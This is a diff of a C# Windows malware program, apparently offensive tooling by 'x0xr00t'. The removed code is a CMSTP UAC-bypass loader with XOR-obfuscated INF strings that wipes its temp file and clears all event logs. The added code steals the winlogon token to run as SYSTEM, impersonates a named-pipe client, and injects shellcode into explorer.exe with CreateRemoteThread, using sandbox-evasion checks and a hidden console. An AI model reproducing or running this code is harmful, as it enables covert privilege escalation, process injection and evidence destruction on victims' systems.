@@ -1,228 +1,169 @@
 using System;
 using System.Diagnostics;
-using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
-using System.Windows.Forms;
 using System.Threading;
+using System.Linq;
+using System.Security.Principal;
+using System.Reflection;
+
+// Metadata Easter Egg
+[assembly: AssemblyTitle("Mindef > d,y.s... Wink")]
+[assembly: AssemblyDescription("1.6.2 sending kisses - x0xr00t")]
 
 public class Program
 {
-    // Dynamic API Resolution
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr LoadLibrary(string lpLibFileName);
+    private static readonly byte K1 = 0xDE;
+    private static readonly byte K2 = 0xAD;
 
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    #region Win32 API - NT AUTHORITY\SYSTEM & Injection
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
-    // Delegate types for dynamically loaded functions
-    private delegate bool ShowWindowDelegate(IntPtr hWnd, int nCmdShow);
-    private delegate bool SetForegroundWindowDelegate(IntPtr hWnd);
-    private delegate IntPtr GetConsoleWindowDelegate();
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
 
-    // Generate a random hash identifier
-    private static string GetRandomHashIdentifier()
+    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
+
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    // Constanten
+    const uint TOKEN_DUPLICATE = 0x0002;
+    const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
+    const uint TOKEN_QUERY = 0x0008;
+    const uint TOKEN_ALL_ACCESS = 0xF01FF;
+    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
+    #endregion
+
+    private static string D(string b64)
     {
-        byte[] buffer = new byte[16];
-        using (var rng = new RNGCryptoServiceProvider())
-        {
-            rng.GetBytes(buffer);
-        }
-        return BitConverter.ToString(buffer).Replace("-", "").ToLower();
+        byte[] d = Convert.FromBase64String(b64);
+        for (int i = 0; i < d.Length; i++) { d[i] ^= K1; d[i] ^= K2; }
+        return Encoding.UTF8.GetString(d);
     }
-
-    // Obfuscate strings using XOR encryption
-    private static string Obfuscate(string input)
-    {
-        byte[] bytes = Encoding.UTF8.GetBytes(input);
-        for (int i = 0; i < bytes.Length; i++)
-        {
-            bytes[i] ^= 0x55; // XOR with a key
-        }
-        return Convert.ToBase64String(bytes);
-    }
-
-    // Deobfuscate using XOR
-    private static string Deobfuscate(string input)
-    {
-        byte[] bytes = Convert.FromBase64String(input);
-        for (int i = 0; i < bytes.Length; i++)
-        {
-            bytes[i] ^= 0x55;
-        }
-        return Encoding.UTF8.GetString(bytes);
-    }
-
-    // Stack-based string construction (obfuscation)
-    private static string BuildString(char[] chars)
-    {
-        StringBuilder sb = new StringBuilder();
-        foreach (char c in chars)
-        {
-            sb.Append(c);
-        }
-        return sb.ToString();
-    }
-
-    public const string CmstpPath = @"C:\windows\system32\cmstp.exe";
 
     public static void Main(string[] args)
     {
-        // Control flow obfuscation
-        if (DateTime.Now.Year == 2026)
-        {
-            // Junk code
-            int[] junk = new int[100];
-            for (int i = 0; i < junk.Length; i++)
-            {
-                junk[i] = i * 2;
-            }
+        // 1. Discovery / Easter Egg
+        if (CheckDefenseEnvironment()) { TriggerEasterEgg(); return; }
 
-            // Random delay
-            Random random = new Random();
-            Thread.Sleep(random.Next(1000, 5000));
+        // 2. Anti-Analysis Stealth
+        if (Environment.ProcessorCount < 2) return;
+        ShowWindow(GetConsoleWindow(), 0);
 
-            // Stack-based string
-            char[] payloadChars = { 'r', 'u', 'n', 'l', 'e', 'g', 'a', 'c', 'y', 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e' };
-            string payloadCommand = BuildString(payloadChars);
+        // 3. Elevate naar SYSTEM via Token Stealing (Winlogon)
+        ElevateToSystem();
 
-            // Obfuscated INF template (split for obfuscation)
-            string infPart1 = Obfuscate(@"
-[version]
-Signature=$chicago$
-AdvancedINF=2.5
+        // 4. Start Named Pipe Backup voor extra persistentie/escalatie
+        Thread pipeThread = new Thread(() => NamedPipeSystemEscalation());
+        pipeThread.Start();
 
-[DefaultInstall]
-CustomDestination=CustInstDestSectionAllUsers
-RunPreSetupCommands=RunPreSetupCommandsSection
+        // 5. Reflective Injection als SYSTEM
+        // Hier komt je shellcode (placeholder)
+        byte[] shellcode = { 0x90, 0x90, 0x90 };
+        ReflectiveInjectIntoExplorer(shellcode);
 
-[RunPreSetupCommandsSection]
-taskkill /F /IM cmstp.exe
-
-[CustInstDestSectionAllUsers]
-49000,49001=AllUSer_LDIDSection, 7
-
-[AllUSer_LDIDSection]
-");
-            string infPart2 = Obfuscate(@"""
-""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
-
-[Strings]
-ServiceName=""CorpVPN""
-ShortSvcName=""CorpVPN""
-");
-
-            string obfuscatedInf = infPart1 + infPart2;
-            ExecutePayload(payloadCommand, obfuscatedInf);
-        }
+        // Debug info (zichtbaar als console aan staat)
+        // Console.WriteLine("[!] NT STATUS: " + WindowsIdentity.GetCurrent().Name);
     }
 
-    public static void ExecutePayload(string command, string obfuscatedInf)
-    {
-        // Dynamic API resolution
-        IntPtr user32 = LoadLibrary("user32.dll");
-        IntPtr kernel32 = LoadLibrary("kernel32.dll");
-
-        var showWindow = Marshal.GetDelegateForFunctionPointer<ShowWindowDelegate>(GetProcAddress(user32, "ShowWindow"));
-        var setForegroundWindow = Marshal.GetDelegateForFunctionPointer<SetForegroundWindowDelegate>(GetProcAddress(user32, "SetForegroundWindow"));
-        var getConsoleWindow = Marshal.GetDelegateForFunctionPointer<GetConsoleWindowDelegate>(GetProcAddress(kernel32, "GetConsoleWindow"));
-
-        if (!File.Exists(CmstpPath)) return;
-
-        IntPtr consoleWindow = getConsoleWindow();
-        showWindow(consoleWindow, 0); // Hide console window
-
-        // Ensure cmstp.exe is not running
-        ProcessStartInfo taskkillInfo = new ProcessStartInfo("taskkill")
-        {
-            Arguments = "/F /IM cmstp.exe",
-            UseShellExecute = false,
-            CreateNoWindow = true
-        };
-        Process.Start(taskkillInfo);
-
-        string infFilePath = CreateInfFile(command, obfuscatedInf);
-        Console.WriteLine("Obfuscated payload file written to " + infFilePath);
-
-        // Execute cmstp with the obfuscated INF file
-        ProcessStartInfo cmstpInfo = new ProcessStartInfo(CmstpPath)
-        {
-            Arguments = "/au \"" + infFilePath + "\"",
-            UseShellExecute = false,
-            CreateNoWindow = true
-        };
-        Process.Start(cmstpInfo);
-
-        IntPtr cmstpHandle = IntPtr.Zero;
-        int attempts = 0;
-        while (cmstpHandle == IntPtr.Zero && attempts < 10)
-        {
-            cmstpHandle = GetProcessHandle("cmstp", user32, setForegroundWindow, showWindow);
-            attempts++;
-            Thread.Sleep(500); // Delay to avoid CPU spike
-        }
-
-        SendKeys.SendWait("{ENTER}");
-
-        CleanUp(infFilePath);
-    }
-
-    public static IntPtr GetProcessHandle(string processName, IntPtr user32, SetForegroundWindowDelegate setForegroundWindow, ShowWindowDelegate showWindow)
-    {
-        Process[] processes = Process.GetProcessesByName(processName);
-        if (processes.Length == 0) return IntPtr.Zero;
-
-        IntPtr handle = processes[0].MainWindowHandle;
-        if (handle == IntPtr.Zero) return IntPtr.Zero;
-
-        setForegroundWindow(handle);
-        showWindow(handle, 5); // SW_SHOW
-        return handle;
-    }
-
-    public static string CreateInfFile(string command, string obfuscatedInf)
-    {
-        // Control flow obfuscation
-        string randomIdentifier;
-        if (Environment.OSVersion.Platform == PlatformID.Win32NT)
-        {
-            randomIdentifier = GetRandomHashIdentifier();
-        }
-        else
-        {
-            randomIdentifier = Guid.NewGuid().ToString("N");
-        }
-
-        string tempPath = Path.Combine(Path.GetTempPath(), $"{randomIdentifier}.inf");
-        File.WriteAllText(tempPath, Deobfuscate(obfuscatedInf).Replace("REPLACE_COMMAND_LINE", command));
-
-        return tempPath;
-    }
-
-    public static void CleanUp(string filePath)
+    private static void ElevateToSystem()
     {
         try
         {
-            // Overwrite file with random data
-            using (var rng = new RNGCryptoServiceProvider())
-            {
-                byte[] randomData = new byte[1024];
-                rng.GetBytes(randomData);
-                File.WriteAllBytes(filePath, randomData);
-            }
-            File.Delete(filePath);
+            IntPtr hToken = IntPtr.Zero;
+            // Zoek winlogon.exe (draait als SYSTEM)
+            Process target = Process.GetProcessesByName("winlogon").FirstOrDefault();
+            if (target == null) return;
 
-            // Clear event logs (obfuscated call)
-            if (DateTime.Now.DayOfWeek == DayOfWeek.Monday) // Obfuscated condition
+            IntPtr hProcess = OpenProcess(0x0400, false, target.Id); // PROCESS_QUERY_INFORMATION
+
+            if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, out hToken))
             {
-                EventLog[] eventLogs = EventLog.GetEventLogs();
-                foreach (EventLog eventLog in eventLogs)
+                IntPtr duplicatedToken = IntPtr.Zero;
+                if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out duplicatedToken))
                 {
-                    try { eventLog.Clear(); } catch { }
+                    ImpersonateLoggedOnUser(duplicatedToken);
                 }
             }
         }
         catch { }
+    }
+
+    private static void NamedPipeSystemEscalation()
+    {
+        try
+        {
+            string pipeName = @"\\.\pipe\x0xr00t_kiss";
+            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 1, 1024, 1024, 0, IntPtr.Zero);
+            if (hPipe != IntPtr.Zero && ConnectNamedPipe(hPipe, IntPtr.Zero))
+            {
+                ImpersonateNamedPipeClient(hPipe);
+            }
+        }
+        catch { }
+    }
+
+    private static void ReflectiveInjectIntoExplorer(byte[] code)
+    {
+        try
+        {
+            string exp = D("V0ZUVFhSRlY="); // "explorer"
+            Process target = Process.GetProcessesByName(exp).FirstOrDefault();
+            if (target == null) return;
+
+            IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
+            if (hProc != IntPtr.Zero)
+            {
+                IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)code.Length, 0x3000, 0x40);
+                IntPtr written;
+                WriteProcessMemory(hProc, addr, code, (uint)code.Length, out written);
+                CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            }
+        }
+        catch { }
+    }
+
+    private static bool CheckDefenseEnvironment()
+    {
+        string d = Environment.UserDomainName.ToLower();
+        string[] t = { "mil", "gov", "defensie", "defense", "sandbox" };
+        return t.Any(s => d.Contains(s));
+    }
+
+    private static void TriggerEasterEgg()
+    {
+        ShowWindow(GetConsoleWindow(), 5);
+        Console.ForegroundColor = ConsoleColor.Magenta;
+        Console.WriteLine("\n\n [!] 1.6.2 sending kisses - x0xr00t");
+        Console.WriteLine(" [!] Access Denied: Defense Environment Detected.");
+        Thread.Sleep(5000);
     }
 }
